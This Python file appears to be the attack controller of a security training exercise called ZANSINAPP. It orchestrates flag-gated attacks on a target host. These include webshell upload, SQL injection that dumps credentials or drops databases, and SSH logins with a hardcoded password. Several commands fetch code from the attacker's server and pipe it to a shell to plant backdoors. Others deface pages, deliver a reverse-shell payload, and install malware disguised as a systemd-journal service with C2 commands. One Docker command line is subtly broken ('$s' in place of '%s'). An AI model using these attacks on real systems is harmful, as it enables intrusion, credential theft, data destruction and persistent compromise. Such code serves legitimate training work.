#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# cmd
# python3 -m venv venv
# .\venv\Scripts\activate.bat
#  or
# source ./venv/bin/activate
# pip3 install -r requirements.txt
# for vscode: View->Command Palette->set `Python: Select Interpreter`
# python attack_controller.py 192.168.159.131 192.168.10.222 42375
# Logo: ANSI Shadow at https://manytools.org/hacker-tools/ascii-banner/
import os
import sys
import time
import base64
import ipaddress
from .util import Utility
from .poc.zansinapp_atk_upload_php import AtkUploadPHP
from .poc.zansinapp_atk_docker_api import AtkDockerApi
from .poc.zansinapp_atk_debug_api import AtkDebugApi
from .poc.zansinapp_atk_gamecheat_sqli import AtkGameCheatSQLi
from .poc.zansinapp_atk_gamecheat_battle_leveling import AtkGameCheatBattleLeveling
from .poc.zansinapp_atk_gamecheat_dump_credentials import AtkGameCheatDumpCredentials
from .poc.zansinapp_atk_gamecheat_userlist_ban import AtkGameCheatUserListBan
from .poc.zansinapp_atk_backdoor_create_cheatuser import AtkBackdoorCreateCheatUser
from .poc.zansinapp_atk_drop_db_sqli import AtkDropDBSQLi
#from poc.zansinapp_atk_backdoor_webshell_send_cmd import AtkBackdoorWebshellSendCmd
from .poc.zansinapp_atk_gamecheat_zerocost_gacha import AtkGameCheatZeroCostGacha
from .poc.zansinapp_atk_ssh import AtkSSH
from .poc.zansinapp_atk_passcrack_ssh import AtkPassCrackSSH
from .poc.zansinapp_atk_nmap import AtkNmap
from .poc.zansinapp_atk_nikto import AtkNikto
from .poc.zansinapp_atk_rshell import AtkReverseShell
from .poc.zansinapp_atk_web import AtkWebServer
from .poc.zansinapp_atk_dns import AtkDnsServer

OK = 'ok'         # [*]
NOTE = 'note'     # [+]
FAIL = 'fail'     # [-]
WARNING = 'warn'  # [!]
NONE = 'none'     # No label.

OK_BLUE = '\033[94m'      # [*]
NOTE_GREEN = '\033[92m'   # [+]
FAIL_RED = '\033[91m'     # [-]
WARN_YELLOW = '\033[93m'  # [!]
ENDC = '\033[0m'

FLAG_NMAP_SCAN = False
FLAG_NIKTO_SCAN = False
FLAG_UPLOAD_WEBSHELL_PHP = False
FLAG_UPLOAD_CHEATUSER_PHP = False
FLAG_DOCKER_API_EXPLOIT_SET_BACKDOOR = False
FLAG_DEBUG_API_EXPLOIT_SET_BACKDOOR = False
FLAG_SSH_EXPLOIT_SET_BACKDOOR = False
FLAG_GAMECHEAT_LOGIN_SQLI = False
FLAG_GAMECHEAT_CREATE_SQLI = False
FLAG_GAMECHEAT_BATTLE_LEVELING = False
FLAG_GAMECHEAT_DUMP_CREDENTIAL = False
FLAG_GAMECHEAT_DUMP_CREDENTIAL_AND_DELETE = False
FLAG_GAMECHEAT_USERLIST_BAN = False
FLAG_GAMECHEAT_ZEROCOST_GACHA = False
FLAG_BACKDOOR_CREATE_CHEATUSER = False
FLAG_DROP_DATABASE_LOGIN_SQLI = False
FLAG_DROP_DATABASE_CREATE_SQLI = False
FLAG_DEBUG_API_EXPLOIT_OVERWEITE_INDEX = False
FLAG_DOCKER_API_EXPLOIT_OVERWRITE_INDEX = False
FLAG_PASSWD_CRACK_SSH = False
FLAG_RSHELL_MALWARE_DNS = False
FLAG_SSH_EXPLOIT_MALWARE_DNS = False
FLAG_C2_EXPLOIT_WALL = False


def show_banner(utility):
    banner = """
███████╗ █████╗ ███╗   ██╗███████╗██╗███╗   ██╗ █████╗ ██████╗ ██████╗        █████╗ ████████╗██╗  ██╗
╚══███╔╝██╔══██╗████╗  ██║██╔════╝██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗██╗██╗██╔══██╗╚══██╔══╝██║ ██╔╝
  ███╔╝ ███████║██╔██╗ ██║███████╗██║██╔██╗ ██║███████║██████╔╝██████╔╝╚═╝╚═╝███████║   ██║   █████╔╝ 
 ███╔╝  ██╔══██║██║╚██╗██║╚════██║██║██║╚██╗██║██╔══██║██╔═══╝ ██╔═══╝ ██╗██╗██╔══██║   ██║   ██╔═██╗ 
███████╗██║  ██║██║ ╚████║███████║██║██║ ╚████║██║  ██║██║     ██║     ╚═╝╚═╝██║  ██║   ██║   ██║  ██╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝           ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    
""" + 'by ' + os.path.basename(__file__)
    #print(banner)
    utility.print_message(NONE, banner)
    show_credit(utility)
    time.sleep(utility.banner_delay)


# Show credit.
def show_credit(utility):
    credit = u"""
       =[ Version : ZANSINAPP::ATK v0.0.1                  ]=
    """
    utility.print_message(NONE, credit)


def wrap_text(type, text):
    if type == OK:
        return OK_BLUE + text + ENDC
    elif type == NOTE:
        return NOTE_GREEN + text + ENDC
    elif type == FAIL:
        return FAIL_RED + text + ENDC
    elif type == WARNING:
        return WARN_YELLOW + text + ENDC
    else:
        return text


def attack_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_num, user_agent):
    debug = False

    target = "127.0.0.1"
    server = "127.0.0.1"
    serverport = "12345"

    try:
        target = str(ipaddress.ip_address(target_host_ip))
        server = str(ipaddress.ip_address(self_host_ip))
        serverport = self_host_port
        if not 1 <= int(serverport) <= 65535:
            raise ValueError("Invalid port number")
    except Exception as e:
        print("Error: %s" % e)
        sys.exit(1)

    utility = Utility(target)
    show_banner(utility)

    #===========================================================================
    # 00. Generate files and start servers
    #===========================================================================
    utility.generage_public_files(target, server, utility.reverseshellport)
    webserver = AtkWebServer(server, serverport, debug)
    webserver.startserver()
    dnsserver = AtkDnsServer(debug)

    #===========================================================================
    # 01. Vulunerable: Upload WebShell 
    #===========================================================================
    if FLAG_UPLOAD_WEBSHELL_PHP:
        utility.print_message(OK, wrap_text(OK, "%s:Upload PHP: WebShell" % (utility.get_current_date())))
        atk_upload_webshell = AtkUploadPHP(utility, target, "80", debug)
        atk_upload_webshell.sendattack("./public/login.php")
        time.sleep(1)

    #===========================================================================
    # 02. Vulunerable: Upload Cheat Page 
    #===========================================================================
    if FLAG_UPLOAD_CHEATUSER_PHP:
        utility.print_message(OK, wrap_text(OK, "%s:Upload PHP: Cheat User Page" % (utility.get_current_date())))
        atk_upload_webshell = AtkUploadPHP(utility, target, "80", debug)
        atk_upload_webshell.sendattack("./public/new_user.php")
        time.sleep(1)

    #===========================================================================
    # 03. Vulunerable: Debug API(set Backdoor)
    #===========================================================================
    if FLAG_DEBUG_API_EXPLOIT_SET_BACKDOOR:
        utility.print_message(OK, wrap_text(OK, "%s:Debug API Exploit: set backdoor" % (utility.get_current_date())))
        atk_debug_api_set_backdoor = AtkDebugApi(utility, target, "80", debug)
        # mount -t ext4 /dev/sda2 /mnt; chroot /mnt /bin/sh -c "curl -s http://192.168.10.222:42375/docker.txt | /bin/sh"
        # b64cmd = "bW91bnQgLXQgZXh0NCAvZGV2L3NkYTIgL21udDsgY2hyb290IC9tbnQgL2Jpbi9zaCAtYyAiY3VybCAtcyBodHRwOi8vMTkyLjE2OC4xMC4yMjI6NDIzNzUvZG9ja2VyLnR4dCB8IC9iaW4vc2giCg==="
        cmd = 'mount -t ext4 /dev/sda2 /mnt; chroot /mnt /bin/sh -c "curl -s http://%s:%s/bd.txt | /bin/sh"' % (server, serverport)
        b64cmd = base64.b64encode(cmd.encode()).decode()
        atk_debug_api_set_backdoor.sendattack("/debug/login", b64cmd)
        time.sleep(1)

    #===========================================================================
    # 04. Vulunerable: Docker API(set Backdoor)
    #===========================================================================
    if FLAG_DOCKER_API_EXPLOIT_SET_BACKDOOR:
        utility.print_message(OK, wrap_text(OK, "%s:Docker API Exploit" % (utility.get_current_date())))
        atk_docker_api_set_backdoor = AtkDockerApi(utility, target, "2375", debug)
        # curl -s http://xxx.xxx.xxx.xxx:42375/docker.txt | /bin/sh
        # b64cmd = "Y3VybCAtcyBodHRwOi8vMTkyLjE2OC4xMC4yMjI6NDIzNzUvZG9ja2VyLnR4dCB8IC9iaW4vc2g="
        cmd = 'curl -s http://$s:%s/bd.txt | /bin/sh' % (server, serverport)
        b64cmd = base64.b64encode(cmd.encode()).decode()
        atk_docker_api_set_backdoor.sendattack(b64cmd)
        time.sleep(1)

    #===========================================================================
    # 05. GameCheat: SQL Injection
    #===========================================================================
    if FLAG_GAMECHEAT_LOGIN_SQLI:
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Login SQLi" % (utility.get_current_date())))
        atk_cheat_login_sqli = AtkGameCheatSQLi(utility, target, "80", debug)
        atk_cheat_login_sqli.sendattack("/login", 10)
        time.sleep(1)

    if FLAG_GAMECHEAT_CREATE_SQLI:
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Create SQLi" % (utility.get_current_date())))
        atk_cheat_login_sqli = AtkGameCheatSQLi(utility, target, "80", debug)
        atk_cheat_login_sqli.sendattack("/create", 10)
        time.sleep(1)

    #===========================================================================
    # 06. GameCheat: Battle Leveling
    #===========================================================================
    if FLAG_GAMECHEAT_BATTLE_LEVELING:
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Battle Leveling" % (utility.get_current_date())))
        atk_cheat_battle_leveling = AtkGameCheatBattleLeveling(utility, target, "80", debug)
        atk_cheat_battle_leveling.sendattack(10, 4123) # num of create user(s), exp
        time.sleep(1)

    #===========================================================================
    # 07. GameCheat: Dump Credentials
    #===========================================================================
    if FLAG_GAMECHEAT_DUMP_CREDENTIAL:
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Dump Credentials" % (utility.get_current_date())))
        atk_cheat_dump_credentials = AtkGameCheatDumpCredentials(utility, target, "80", debug)
        atk_cheat_dump_credentials.sendattack(10, False, True) # num of delete user(s), delete flag, reverse flag
        time.sleep(1)

    #===========================================================================
    # 08. GameCheat: Dump Credentials and Delete
    #===========================================================================
    if FLAG_GAMECHEAT_DUMP_CREDENTIAL_AND_DELETE:
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Dump Credentials and Delete" % (utility.get_current_date())))
        atk_cheat_dump_credential_and_delete = AtkGameCheatDumpCredentials(utility, target, "80", debug)
        atk_cheat_dump_credential_and_delete.sendattack(10, True, True) # num of delete user(s), delete flag, reverse flag
        time.sleep(1)

    #===========================================================================
    # 09. GameCheat: UserList Ban
    #===========================================================================
    if FLAG_GAMECHEAT_USERLIST_BAN:
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat UserList Ban" % (utility.get_current_date())))
        atk_cheat_userlist_ban = AtkGameCheatUserListBan(utility, target, "80", debug)
        atk_cheat_userlist_ban.sendattack(10, True) # num of delete user(s), reverse flag
        time.sleep(1)

    #===========================================================================
    # 10. Backdoor: Create Cheat User
    #===========================================================================
    if FLAG_BACKDOOR_CREATE_CHEATUSER:
        utility.print_message(OK, wrap_text(OK, "%s:Backdoor Create Cheat User" % (utility.get_current_date())))
        atk_backdoor_create_cheat_user = AtkBackdoorCreateCheatUser(utility, target, "80", debug)
        atk_backdoor_create_cheat_user.sendattack("/images/players/new_user.php", 10) # backdoor path, num of delete user(s)
        time.sleep(1)

    #===========================================================================
    # 11. Vulunerable: Drop Database
    #===========================================================================
    if FLAG_DROP_DATABASE_LOGIN_SQLI:
        utility.print_message(OK, wrap_text(OK, "%s:Drop Database SQLi Exploit: Login" % (utility.get_current_date())))
        atk_drop_database = AtkDropDBSQLi(utility, target, "80", debug)
        atk_drop_database.sendattack("/login")
        time.sleep(1)
    
    if FLAG_DROP_DATABASE_CREATE_SQLI:
        utility.print_message(OK, wrap_text(OK, "%s:Drop Database SQLi Exploit: Create User" % (utility.get_current_date())))
        atk_drop_database = AtkDropDBSQLi(utility, target, "80", debug)
        atk_drop_database.sendattack("/create")
        time.sleep(1)

    #===========================================================================
    # 12. Vulunerable: Debug API(Overwrite index.html)
    #===========================================================================
    if FLAG_DEBUG_API_EXPLOIT_OVERWEITE_INDEX:
        utility.print_message(OK, wrap_text(OK, "%s:Debug API Exploit: Web page tampering" % (utility.get_current_date())))
        atk_debug_api_overrite_index = AtkDebugApi(utility, target, "80", debug)
        # mount -t ext4 /dev/sda2 /mnt; chroot /mnt /bin/bash -c 'if [ -f "/var/www/mini4-front/index.html.backup" ]; then echo "OK"; else cp -p /var/www/mini4-front/index.html /var/www/mini4-front/index.html.backup; rm -f /var/www/mini4-front/index.html; curl -s http://192.168.10.222:42375/index.html -o /var/www/mini4-front/index.html; wget http://192.168.10.222:42375/index.html -O /var/www/mini4-front/index.html; fi'
        # b64cmd = "Y2hyb290IC9tbnQgL2Jpbi9iYXNoIC1jICdpZiBbIC1mICIvdmFyL3d3dy9taW5pNC1mcm9udC9pbmRleC5odG1sLmJhY2t1cCIgXTsgdGhlbiBlY2hvICJPSyI7IGVsc2UgY3AgLXAgL3Zhci93d3cvbWluaTQtZnJvbnQvaW5kZXguaHRtbCAvdmFyL3d3dy9taW5pNC1mcm9udC9pbmRleC5odG1sLmJhY2t1cDsgcm0gLWYgL3Zhci93d3cvbWluaTQtZnJvbnQvaW5kZXguaHRtbDsgY3VybCAtcyBodHRwOi8vMTkyLjE2OC4xMC4yMjI6NDIzNzUvaW5kZXguaHRtbCAtbyAvdmFyL3d3dy9taW5pNC1mcm9udC9pbmRleC5odG1sOyB3Z2V0IGh0dHA6Ly8xOTIuMTY4LjEwLjIyMjo0MjM3NS9pbmRleC5odG1sIC1PIC92YXIvd3d3L21pbmk0LWZyb250L2luZGV4Lmh0bWw7IGZpJw=="
        cmd = 'mount -t ext4 /dev/sda2 /mnt; chroot /mnt /bin/bash -c "if [ -f \'/var/www/mini4-front/index.html.backup\' ]; then echo \'OK\'; else cp -p /var/www/mini4-front/index.html /var/www/mini4-front/index.html.backup; rm -f /var/www/mini4-front/index.html; curl -s http://%s:%s/index.html -o /var/www/mini4-front/index.html; wget http://%s:%s/index.html -O /var/www/mini4-front/index.html; fi"' % (server, serverport, server, serverport)
        b64cmd = base64.b64encode(cmd.encode()).decode()
        atk_debug_api_overrite_index.sendattack("/debug/login", b64cmd)
        time.sleep(1)

    #===========================================================================
    # 13. Vulunerable: Docker API(Overwrite index.html)
    #===========================================================================
    if FLAG_DOCKER_API_EXPLOIT_OVERWRITE_INDEX:
        utility.print_message(OK, wrap_text(OK, "%s:Docker API Exploit: Web page tampering" % (utility.get_current_date())))
        atk_docker_api_overwite_index = AtkDockerApi(utility, target, "2375", debug)
        # if [ -f "/var/www/mini4-front/index.html.backup" ]; then echo "OK"; else cp -p /var/www/mini4-front/index.html /var/www/mini4-front/index.html.backup; rm -f /var/www/mini4-front/index.html; curl -s http://192.168.10.222:42375/index.html -o /var/www/mini4-front/index.html; wget http://192.168.10.222:42375/index.html -O /var/www/mini4-front/index.html; fi
        # b64cmd = "aWYgWyAtZiAiL3Zhci93d3cvbWluaTQtZnJvbnQvaW5kZXguaHRtbC5iYWNrdXAiIF07IHRoZW4gZWNobyAiT0siOyBlbHNlIGNwIC1wIC92YXIvd3d3L21pbmk0LWZyb250L2luZGV4Lmh0bWwgL3Zhci93d3cvbWluaTQtZnJvbnQvaW5kZXguaHRtbC5iYWNrdXA7IHJtIC1mIC92YXIvd3d3L21pbmk0LWZyb250L2luZGV4Lmh0bWw7IGN1cmwgLXMgaHR0cDovLzE5Mi4xNjguMTAuMjIyOjQyMzc1L2luZGV4Lmh0bWwgLW8gL3Zhci93d3cvbWluaTQtZnJvbnQvaW5kZXguaHRtbDsgd2dldCBodHRwOi8vMTkyLjE2OC4xMC4yMjI6NDIzNzUvaW5kZXguaHRtbCAtTyAvdmFyL3d3dy9taW5pNC1mcm9udC9pbmRleC5odG1sOyBmaQ=="
        cmd = 'if [ -f "/var/www/mini4-front/index.html.backup" ]; then echo "OK"; else cp -p /var/www/mini4-front/index.html /var/www/mini4-front/index.html.backup; rm -f /var/www/mini4-front/index.html; curl -s http://%s:%s/index.html -o /var/www/mini4-front/index.html; wget http://%s:%s/index.html -O /var/www/mini4-front/index.html; fi' % (server, serverport, server, serverport)
        b64cmd = base64.b64encode(cmd.encode()).decode()
        atk_docker_api_overwite_index.sendattack(b64cmd)
        time.sleep(1)

    #===========================================================================
    # 14. GameCheat: Zero-Cost Gacha
    #===========================================================================
    if FLAG_GAMECHEAT_ZEROCOST_GACHA:
        # this attack is working in background because the script uses too much time. 
        utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Zero-Cost Gacha" % (utility.get_current_date())))
        atk_cheat_zerocost_gacha = AtkGameCheatZeroCostGacha(target, debug)
        atk_cheat_zerocost_gacha.sendattack(0.1, 10000) # interval, count
        time.sleep(1)

    #===========================================================================
    # 15. Vulunerable: SSH Access
    #===========================================================================
    if FLAG_SSH_EXPLOIT_SET_BACKDOOR:
        utility.print_message(OK, wrap_text(OK, "%s:SSH Exploit: set backdoor" % (utility.get_current_date())))
        atk_ssh_set_backdoor = AtkSSH(utility, target, 22, debug)
        users = ("mario","vendor")
        for user in users:
            # curl -s http://xxx.xxx.xxx.xxx:42375/docker.txt | sudo /bin/sh
            # b64cmd = "L2Jpbi9zaCAtYyAiY3VybCAtcyBodHRwOi8vMTkyLjE2OC4xMC4yMjI6NDIzNzUvZG9ja2VyLnR4dCB8IHN1ZG8gL2Jpbi9zaCIK"
            cmd = 'curl -s http://%s:%s/bd.txt | sudo /bin/sh' % (server, serverport)
            b64cmd = base64.b64encode(cmd.encode()).decode()
            stdout = atk_ssh_set_backdoor.sendattack(b64cmd, user, "Passw0rd!23") # b64command, user, passwor
            if stdout != None:
                utility.print_message(OK, wrap_text(OK, "stdout: {}".format(stdout)))
                break
        time.sleep(1)

    #===========================================================================
    # 16. Vulunerable: SSH Password Cracking
    #===========================================================================
    if FLAG_PASSWD_CRACK_SSH:
        utility.print_message(OK, wrap_text(OK, "%s:Password Cracking SSH" % (utility.get_current_date())))
        atk_passcrack_ssh = AtkPassCrackSSH(utility, target, 22, debug)
        users = ("mario", "vendor")
        for user in users:
            pwd = atk_passcrack_ssh.sendattack(user) # user
            if pwd != None:
                utility.print_message(OK, wrap_text(OK, "password: {}".format(pwd)))
                break
        time.sleep(1)

    #===========================================================================
    # 17. Scan: Nmap TCP Scan
    #===========================================================================
    if FLAG_NMAP_SCAN:
        utility.print_message(OK, wrap_text(OK, "%s:Nmap Scan" % (utility.get_current_date())))
        atk_nmap = AtkNmap(target, debug)
        open_ports = atk_nmap.sendattack()
        utility.print_message(OK, wrap_text(OK, "open_ports: {}".format(open_ports)))
        time.sleep(1)

    #===========================================================================
    # 18. Scan: Nikto Scan
    #===========================================================================
    if FLAG_NIKTO_SCAN:
        # this scan is working in background because the script uses too much time. 
        utility.print_message(OK, wrap_text(OK, "%s:Nikto Scan" % (utility.get_current_date())))
        atk_nikto = AtkNikto(utility, target, "nikto", debug)
        atk_nikto.sendattack()
        time.sleep(1)
    
    #===========================================================================
    # 19. PostExploit: Upload malware
    #===========================================================================
    # make .syspoll file
    # execute: echo "some; commands;" | nc -lvp 5014
    # generate docker.txt is maybe needed.
    if FLAG_RSHELL_MALWARE_DNS:
        # this scan is working in background because the script uses too much time.
        serverhost = server + ":" + serverport
        tmpcmd = 'curl -s http://%s/_.systemd-journal.bin -o /var/tmp/systemd-private-journal && chmod 755 /var/tmp/systemd-private-journal && curl -s http://%s/_.syspoll-b64 -o /var/tmp/systemd-private-journal-zWuKif && curl -s http://%s/systemd-journal.service -o /etc/systemd/system/systemd-journal.service ; systemctl daemon-reload ; systemctl start systemd-journal.service ; systemctl enable systemd-journal.service ;' % (serverhost, serverhost, serverhost)
        cmd = "echo \"%s\" | nc -lvp %s" % (tmpcmd, str(utility.reverseshellport))
        utility.print_message(OK, wrap_text(OK, "%s:Upload Malware" % (utility.get_current_date())))
        atk_reverse_shell_mal = AtkReverseShell(utility, target, cmd, debug)
        atk_reverse_shell_mal.sendattack()
        time.sleep(1)

    #===========================================================================
    # 20. PostExploit: SSH install malware
    #===========================================================================
    if FLAG_SSH_EXPLOIT_MALWARE_DNS:
        utility.print_message(OK, wrap_text(OK, "%s:SSH Exploit: install malware" % (utility.get_current_date())))
        atk_ssh_set_backdoor = AtkSSH(utility, target, 22, debug)
        users = ("mario","vendor")
        for user in users:
            serverhost = server + ":" + serverport
            cmd = 'sudo curl -s http://%s/_.systemd-journal.bin -o /var/tmp/systemd-private-journal && sudo chmod 755 /var/tmp/systemd-private-journal && sudo curl -s http://%s/_.syspoll-b64 -o /var/tmp/systemd-private-journal-zWuKif && sudo curl -s http://%s/systemd-journal.service -o /etc/systemd/system/systemd-journal.service ; sudo systemctl daemon-reload ; sudo systemctl start systemd-journal.service ; sudo systemctl enable systemd-journal.service ;' % (serverhost, serverhost, serverhost)
            b64cmd = base64.b64encode(cmd.encode()).decode()
            stdout = atk_ssh_set_backdoor.sendattack(b64cmd, user, "Passw0rd!23") # b64command, user, passwor
            if stdout != None:
                utility.print_message(OK, wrap_text(OK, "stdout: {}".format(stdout)))
                break
        time.sleep(1)

    #===========================================================================
    # 21. PostExploit: execute C2 Command: wall
    #===========================================================================
    if FLAG_C2_EXPLOIT_WALL:
        utility.print_message(OK, wrap_text(OK, "%s:Execute C2 Command" % (utility.get_current_date())))
        dnsserver.startserver()
        utility.add_c2cmd(target, "wall Hi,\ I\ am\ a\ malware.")
        time.sleep(1)

    #===========================================================================
    # 99. Stop Web Server
    #===========================================================================
    time.sleep(5)
    webserver.stopserver()

    utility.print_message(NOTE, "Finish!")
